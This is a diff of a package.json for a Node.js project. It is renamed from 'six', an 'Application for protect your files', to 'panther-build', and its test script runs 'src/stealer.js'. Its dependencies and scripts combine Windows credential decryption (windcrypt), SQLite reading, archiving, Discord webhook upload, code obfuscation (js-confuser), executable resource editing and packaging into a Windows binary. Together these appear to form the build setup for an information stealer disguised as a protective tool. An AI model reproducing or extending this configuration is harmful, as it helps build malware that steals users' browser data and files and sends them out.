@@ -1,78 +1,25 @@
 {
-   "name": "six",
+   "name": "panther-build",
    "version": "0.0.1",
-   "description": "Application for protect your files.",
-   "main": "./six.js",
-   "bin": "./six.js",
+   "description": "",
+   "main": "./build.js",
    "license": "MIT",
    "scripts": {
-      "teste": "node ./src/index.js",
-      "build": "npm run clean && pkg . --compress Brotli",
-      "rebuild": "cd ./node_modules/windcrypt && npx node-gyp rebuild --target=18.19.1 && cd ../.. && cd ./node_modules/better-sqlite3 && npx node-gyp rebuild --target=18.19.1 && cd ../..",
-      "clean": "npm prune && npx clean-modules node_modules -y"
-   },
-   "dependencies": {
-      "archiver": "^7.0.1",
-      "better-sqlite3": "^10.0.0",
-      "discord-webhook-node": "^1.1.8",
-      "fast-glob": "^3.3.2",
-      "form-data": "^4.0.0",
-      "fs-extra": "^11.2.0",
-      "koffi": "^2.8.11",
-      "node-fetch": "^2.7.0",
-      "windcrypt": "^1.4.3"
+      "start": "npm i && cd ./src && npm i && cd.. && npm run clean",
+      "clean": "npm prune && npx clean-modules node_modules -y && cd ./src && npm prune && npx clean-modules node_modules -y && cd..",
+      "test": "cd ./src && node stealer.js"
    },
    "devDependencies": {
-      "@yao-pkg/pkg": "^5.11.5",
+      "@yao-pkg/pkg": "^5.12.0",
+      "adm-zip": "^0.5.14",
       "chalk": "^5.3.0",
       "clean-modules": "^3.0.5",
+      "form-data": "^4.0.0",
       "js-confuser": "^1.7.1",
+      "node-fetch": "^2.7.0",
       "node-gyp": "^10.1.0",
       "random-words": "^2.0.1",
-      "readline-sync": "^1.4.10"
-   },
-   "pkg": {
-      "assets": [
-         "./node_modules/koffi/build/koffi/win32_x64/koffi.node",
-         "./node_modules/better-sqlite3/build/Release/better_sqlite3.node",
-         "./node_modules/windcrypt",
-         "./node_modules/archiver/**/*",
-         "./node_modules/discord-webhook-node/**/*",
-         "./node_modules/fast-glob/**/*",
-         "./node_modules/fs-extra/**/*",
-         "./node_modules/node-fetch/**/*"
-      ],
-      "ignore": [
-         "./node_modules/string-width/**/*",
-         "./node_modules/strip-ansi/**/*",
-         "./node_modules/wrap-ansi/**/*",
-         "./node_modules/ansi-regex/**/*",
-         "./node_modules/ansi-styles/**/*",
-         "**/*.test.js",
-         "**/*.spec.js",
-         "**/__tests__/**",
-         "**/test/**",
-         "**/coverage/**",
-         "config.dev.js",
-         "config.local.json",
-         ".env.development",
-         "tmp/**",
-         "logs/**",
-         "*.log",
-         "npm-debug.log",
-         "docs/**",
-         "examples/**",
-         "README.*",
-         "CHANGELOG.*",
-         ".DS_Store",
-         "Thumbs.db",
-         ".vscode/**",
-         ".idea/**",
-         "*.bak",
-         "*.swp"
-      ],
-      "targets": [
-         "node18-win-x64"
-      ]
+      "resedit-cli": "^2.0.0",
+      "tar": "^7.4.3"
    }
 }
